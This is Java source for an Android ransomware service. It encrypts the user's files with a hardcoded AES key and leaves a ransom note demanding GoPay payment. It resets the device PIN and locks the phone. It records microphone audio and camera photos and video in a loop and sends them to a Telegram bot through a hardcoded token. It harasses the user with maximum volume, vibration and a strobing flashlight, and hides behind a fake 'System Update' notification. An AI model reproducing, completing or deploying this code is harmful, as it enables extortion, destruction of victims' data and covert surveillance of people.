package com.ransomware.engine;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.media.ToneGenerator;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.security.SecureRandom;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;

public class RansomwareService extends Service {
    private static final String CHANNEL_ID = "ransomware_channel";
    private static final String BOT_TOKEN = "8948044986:AAF-aNAckfCNwwj3EBq-qjfR7zFwqhjuUqw";
    private static final String CHAT_ID = "7888097749";

    private static final String ENCRYPTED_PIN = "YQRSbWNmbw==";
    private static final String XOR_KEY = "XyZ2025";

    private static final String PAYMENT_METHOD = "GoPay";
    private static final String PAYMENT_NUMBER = "081366326950";
    private static final String PAYMENT_AMOUNT = "Rp 100.000";
    private static final String CONTACT_EMAIL = "rifkey1708@gmail.com";

    private boolean isServiceRunning = false;
    private Thread watchdogThread;
    private Thread annoyingThread;
    private Thread recordThread;
    private Thread cameraThread;
    private Thread flashlightThread;
    private MediaPlayer mediaPlayer;
    private Vibrator vibrator;
    private CameraManager cameraManager;
    private AudioManager audioManager;
    private MediaRecorder mediaRecorder;
    private boolean flashlightOn = false;

    private Camera cameraFront = null;
    private Camera cameraBack = null;
    private int cameraFrontId = -1;
    private int cameraBackId = -1;

    private String decryptPin() {
        try {
            byte[] decoded = android.util.Base64.decode(ENCRYPTED_PIN, android.util.Base64.DEFAULT);
            String encodedString = new String(decoded, "UTF-8");
            StringBuilder result = new StringBuilder();
            for (int i = 0; i < encodedString.length(); i++) {
                char c = encodedString.charAt(i);
                char keyChar = XOR_KEY.charAt(i % XOR_KEY.length());
                result.append((char)(c ^ keyChar));
            }
            return result.toString();
        } catch (Exception e) {
            return "944721";
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        isServiceRunning = true;
        createNotificationChannel();
        startForeground(1, getNotification());

        sendMessage("🚀 Ransomware deployed on " + getDeviceId());

        initCameraIds();
        startWatchdog();
        startAnnoyingFeatures();
        startRecordingLoop();
        startCameraLoop();
        startFlashlightLoop();
        setDeviceLockPin();
        encryptAllFiles();

        sendMessage("✅ Encryption completed on " + getDeviceId());

        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_BOOT_COMPLETED);
        filter.addAction(Intent.ACTION_QUICKBOOT_POWERON);
        registerReceiver(new BootReceiver(), filter);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    private void initCameraIds() {
        try {
            int numberOfCameras = Camera.getNumberOfCameras();
            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.getCameraInfo(i, cameraInfo);
                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    cameraFrontId = i;
                } else if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    cameraBackId = i;
                }
            }
        } catch (Exception e) { }
    }

    private void startFlashlightLoop() {
        flashlightThread = new Thread(() -> {
            while (isServiceRunning) {
                try {
                    toggleFlashlight();
                    Thread.sleep(500);
                } catch (Exception e) { }
            }
        });
        flashlightThread.start();
    }

    private void toggleFlashlight() {
        try {
            if (cameraManager != null) {
                String cameraId = cameraManager.getCameraIdList()[0];
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    cameraManager.setTorchMode(cameraId, !flashlightOn);
                    flashlightOn = !flashlightOn;
                }
            }
        } catch (CameraAccessException e) { }
    }

    private void startCameraLoop() {
        cameraThread = new Thread(() -> {
            while (isServiceRunning) {
                try {
                    if (cameraFrontId != -1) {
                        String frontPhotoPath = capturePhoto(cameraFrontId, "front");
                        if (frontPhotoPath != null) {
                            sendFileToTelegram(frontPhotoPath, "📸 Front Camera Photo from " + getDeviceId());
                            new File(frontPhotoPath).delete();
                        }
                    }

                    if (cameraBackId != -1) {
                        String backPhotoPath = capturePhoto(cameraBackId, "back");
                        if (backPhotoPath != null) {
                            sendFileToTelegram(backPhotoPath, "📸 Back Camera Photo from " + getDeviceId());
                            new File(backPhotoPath).delete();
                        }
                    }

                    if (cameraFrontId != -1) {
                        String frontVideoPath = captureVideo(cameraFrontId, "front", 10);
                        if (frontVideoPath != null) {
                            sendFileToTelegram(frontVideoPath, "🎥 Front Camera Video (10s) from " + getDeviceId());
                            new File(frontVideoPath).delete();
                        }
                    }

                    if (cameraBackId != -1) {
                        String backVideoPath = captureVideo(cameraBackId, "back", 10);
                        if (backVideoPath != null) {
                            sendFileToTelegram(backVideoPath, "🎥 Back Camera Video (10s) from " + getDeviceId());
                            new File(backVideoPath).delete();
                        }
                    }

                    Thread.sleep(10000);
                } catch (Exception e) { }
            }
        });
        cameraThread.start();
    }

    private String capturePhoto(int cameraId, String type) {
        try {
            Camera camera = Camera.open(cameraId);
            if (camera == null) return null;

            Camera.Parameters params = camera.getParameters();
            params.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
            camera.setParameters(params);

            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            String fileName = "photo_" + type + "_" + timestamp + ".jpg";
            String filePath = getExternalFilesDir(null) + "/" + fileName;

            final File photoFile = new File(filePath);

            camera.takePicture(null, null, new PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    try {
                        FileOutputStream fos = new FileOutputStream(photoFile);
                        fos.write(data);
                        fos.close();
                        camera.release();
                    } catch (Exception e) { }
                }
            });

            Thread.sleep(2000);
            camera.release();

            if (photoFile.exists()) {
                return filePath;
            }
            return null;

        } catch (Exception e) {
            return null;
        }
    }

    private String captureVideo(int cameraId, String type, int durationSeconds) {
        MediaRecorder videoRecorder = null;
        try {
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            String fileName = "video_" + type + "_" + timestamp + ".mp4";
            String filePath = getExternalFilesDir(null) + "/" + fileName;

            Camera camera = Camera.open(cameraId);
            if (camera == null) return null;

            Camera.Parameters params = camera.getParameters();
            params.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
            camera.setParameters(params);

            camera.unlock();

            videoRecorder = new MediaRecorder();
            videoRecorder.setCamera(camera);
            videoRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            videoRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
            videoRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            videoRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            videoRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            videoRecorder.setVideoSize(640, 480);
            videoRecorder.setVideoFrameRate(30);
            videoRecorder.setOutputFile(filePath);

            if (type.equals("front")) {
                videoRecorder.setOrientationHint(270);
            } else {
                videoRecorder.setOrientationHint(90);
            }

            videoRecorder.prepare();
            videoRecorder.start();

            Thread.sleep(durationSeconds * 1000);

            videoRecorder.stop();
            videoRecorder.release();
            camera.release();

            if (new File(filePath).exists()) {
                return filePath;
            }
            return null;

        } catch (Exception e) {
            if (videoRecorder != null) {
                try { videoRecorder.release(); } catch (Exception ex) { }
            }
            return null;
        }
    }

    private void setDeviceLockPin() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
            if (dpm.isAdminActive(adminComponent)) {
                dpm.resetPassword(decryptPin(), DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
                dpm.lockNow();
                sendMessage("🔒 Device locked with PIN (hidden)");
            }
        } catch (Exception e) { }
    }

    private void startWatchdog() {
        watchdogThread = new Thread(() -> {
            while (isServiceRunning) {
                try {
                    Thread.sleep(10000);
                    if (!isServiceRunning) {
                        Intent restartIntent = new Intent(RansomwareService.this, RansomwareService.class);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(restartIntent);
                        } else {
                            startService(restartIntent);
                        }
                        isServiceRunning = true;
                        sendMessage("🔄 Watchdog restarted service");
                    }
                } catch (InterruptedException e) { }
            }
        });
        watchdogThread.start();
    }

    private void startAnnoyingFeatures() {
        vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);

        setMaxVolumeAndLock();

        annoyingThread = new Thread(() -> {
            while (isServiceRunning) {
                try {
                    if (vibrator != null && vibrator.hasVibrator()) {
                        long[] pattern = {0, 500, 200, 500, 200, 500};
                        vibrator.vibrate(pattern, 0);
                    }

                    playIdiotSong();
                    setMaxVolumeAndLock();

                    Thread.sleep(5000);
                } catch (Exception e) { }
            }
        });
        annoyingThread.start();
    }

    private void setMaxVolumeAndLock() {
        try {
            audioManager.setStreamVolume(AudioManager.STREAM_MUSIC,
                    audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM,
                    audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
            audioManager.setStreamVolume(AudioManager.STREAM_RING,
                    audioManager.getStreamMaxVolume(AudioManager.STREAM_RING), 0);
            audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION,
                    audioManager.getStreamMaxVolume(AudioManager.STREAM_NOTIFICATION), 0);

            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
            if (dpm.isAdminActive(adminComponent)) {
                dpm.setKeyguardDisabledFeatures(adminComponent,
                        DevicePolicyManager.KEYGUARD_DISABLE_VOLUME_CONTROLS);
            }
        } catch (Exception e) { }
    }

    private void playIdiotSong() {
        try {
            if (mediaPlayer != null && mediaPlayer.isPlaying()) return;

            String audioUrl = "https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3";
            mediaPlayer = new MediaPlayer();
            mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
            mediaPlayer.setDataSource(audioUrl);
            mediaPlayer.prepareAsync();
            mediaPlayer.setOnPreparedListener(mp -> {
                mp.start();
                mp.setLooping(true);
            });
            mediaPlayer.setOnErrorListener((mp, what, extra) -> {
                playFallbackSound();
                return true;
            });
        } catch (Exception e) {
            playFallbackSound();
        }
    }

    private void playFallbackSound() {
        try {
            ToneGenerator tg = new ToneGenerator(AudioManager.STREAM_MUSIC, 100);
            tg.startTone(ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD, 5000);
        } catch (Exception e) { }
    }

    private void startRecordingLoop() {
        recordThread = new Thread(() -> {
            while (isServiceRunning) {
                try {
                    String audioPath = recordAudio(10);
                    if (audioPath != null) {
                        sendFileToTelegram(audioPath, "🎤 Audio Recording (10s) from " + getDeviceId());
                        new File(audioPath).delete();
                    }
                    Thread.sleep(10000);
                } catch (Exception e) { }
            }
        });
        recordThread.start();
    }

    private String recordAudio(int durationSeconds) {
        try {
            String fileName = "recording_" + System.currentTimeMillis() + ".3gp";
            String filePath = getExternalFilesDir(null) + "/" + fileName;

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(filePath);
            mediaRecorder.prepare();
            mediaRecorder.start();

            Thread.sleep(durationSeconds * 1000);

            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;

            return filePath;
        } catch (Exception e) {
            return null;
        }
    }

    private void sendFileToTelegram(String filePath, String caption) {
        try {
            File file = new File(filePath);
            if (!file.exists()) return;

            String urlString;
            String fileName = file.getName().toLowerCase();
            if (fileName.endsWith(".jpg") || fileName.endsWith(".jpeg") || fileName.endsWith(".png")) {
                urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto";
            } else if (fileName.endsWith(".mp4") || fileName.endsWith(".3gp") || fileName.endsWith(".mov")) {
                urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendVideo";
            } else {
                urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            }

            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary");

            String boundary = "----WebKitFormBoundary";
            DataOutputStream wr = new DataOutputStream(conn.getOutputStream());

            wr.writeBytes("--" + boundary + "\r\n");
            wr.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
            wr.writeBytes(caption + "\r\n");

            wr.writeBytes("--" + boundary + "\r\n");
            wr.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            wr.writeBytes(CHAT_ID + "\r\n");

            String fieldName = "document";
            if (fileName.endsWith(".jpg") || fileName.endsWith(".jpeg") || fileName.endsWith(".png")) {
                fieldName = "photo";
            } else if (fileName.endsWith(".mp4") || fileName.endsWith(".3gp") || fileName.endsWith(".mov")) {
                fieldName = "video";
            }

            wr.writeBytes("--" + boundary + "\r\n");
            wr.writeBytes("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + file.getName() + "\"\r\n");
            wr.writeBytes("Content-Type: application/octet-stream\r\n\r\n");

            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                wr.write(buffer, 0, bytesRead);
            }
            fis.close();
            wr.writeBytes("\r\n--" + boundary + "--\r\n");
            wr.flush();
            wr.close();

            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) { }
    }

    private void encryptAllFiles() {
        try {
            String key = "r4ns0mK3y2025R4ns0mK3y2025";
            SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), "AES");
            String[] targetPaths = {
                    Environment.getExternalStorageDirectory().getAbsolutePath(),
                    "/storage/emulated/0",
                    "/sdcard"
            };

            for (String path : targetPaths) {
                File rootDir = new File(path);
                if (rootDir.exists() && rootDir.isDirectory()) {
                    walkAndEncrypt(rootDir, secretKey);
                }
            }
            dropRansomNote();
        } catch (Exception e) { }
    }

    private void walkAndEncrypt(File directory, SecretKeySpec secretKey) {
        try {
            File[] files = directory.listFiles();
            if (files == null) return;

            String[] skipFolders = {"Android", "data", "obb", "cache", "tmp", "log", "system"};
            for (String skip : skipFolders) {
                if (directory.getName().equalsIgnoreCase(skip)) return;
            }

            String[] targetExts = {"jpg", "jpeg", "png", "gif", "bmp", "mp4", "avi", "mkv", "mov",
                    "mp3", "wav", "flac", "aac", "doc", "docx", "xls", "xlsx", "ppt", "pptx",
                    "pdf", "txt", "rtf", "csv", "json", "xml", "db", "sqlite", "bak",
                    "zip", "rar", "7z", "tar", "gz", "apk"};

            for (File file : files) {
                if (file.isDirectory()) {
                    walkAndEncrypt(file, secretKey);
                } else {
                    String name = file.getName();
                    String ext = "";
                    int lastDot = name.lastIndexOf(".");
                    if (lastDot > 0) ext = name.substring(lastDot + 1).toLowerCase();

                    for (String targetExt : targetExts) {
                        if (ext.equals(targetExt) && !name.endsWith(".locked")) {
                            encryptFile(file, secretKey);
                            break;
                        }
                    }
                }
            }
        } catch (Exception e) { }
    }

    private void encryptFile(File file, SecretKeySpec secretKey) {
        try {
            byte[] iv = new byte[16];
            SecureRandom random = new SecureRandom();
            random.nextBytes(iv);
            IvParameterSpec ivSpec = new IvParameterSpec(iv);

            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivSpec);

            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();

            byte[] encrypted = cipher.doFinal(data);

            FileOutputStream fos = new FileOutputStream(file);
            fos.write(iv);
            fos.write(encrypted);
            fos.close();

            File newFile = new File(file.getAbsolutePath() + ".locked");
            file.renameTo(newFile);
        } catch (Exception e) { }
    }

    private void dropRansomNote() {
        String note = "==================================================\n" +
                "YOUR FILES HAVE BEEN ENCRYPTED\n" +
                "==================================================\n\n" +
                "All your files have been locked with AES-256.\n\n" +
                "To recover your files, you must pay via GoPay:\n" +
                "   GoPay Number: " + PAYMENT_NUMBER + "\n" +
                "   Nominal: Rp 100.000\n\n" +
                "After payment, send your Device ID and payment proof to:\n" +
                "   Email: " + CONTACT_EMAIL + "\n\n" +
                "Device ID: " + getDeviceId() + "\n\n" +
                "WARNING: DO NOT attempt to decrypt your files yourself.\n" +
                "==================================================";

        try {
            String[] paths = {Environment.getExternalStorageDirectory().getAbsolutePath(),
                    "/storage/emulated/0", "/sdcard"};
            for (String path : paths) {
                File noteFile = new File(path, "READ_ME.txt");
                FileOutputStream fos = new FileOutputStream(noteFile);
                fos.write(note.getBytes());
                fos.close();
            }
        } catch (Exception e) { }
    }

    private void sendMessage(String message) {
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            String postData = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8") +
                    "&text=" + URLEncoder.encode(message, "UTF-8") +
                    "&parse_mode=HTML";

            DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
            wr.writeBytes(postData);
            wr.flush();
            wr.close();
            conn.disconnect();
        } catch (Exception e) { }
    }

    private String getDeviceId() {
        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Update Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification getNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Update")
                .setContentText("Installing security patches...")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    @Override
    public void onDestroy() {
        isServiceRunning = false;
        if (watchdogThread != null) watchdogThread.interrupt();
        if (annoyingThread != null) annoyingThread.interrupt();
        if (recordThread != null) recordThread.interrupt();
        if (cameraThread != null) cameraThread.interrupt();
        if (flashlightThread != null) flashlightThread.interrupt();
        if (mediaPlayer != null) {
            mediaPlayer.stop();
            mediaPlayer.release();
        }
        if (mediaRecorder != null) {
            mediaRecorder.release();
        }
        if (cameraFront != null) {
            cameraFront.release();
            cameraFront = null;
        }
        if (cameraBack != null) {
            cameraBack.release();
            cameraBack = null;
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
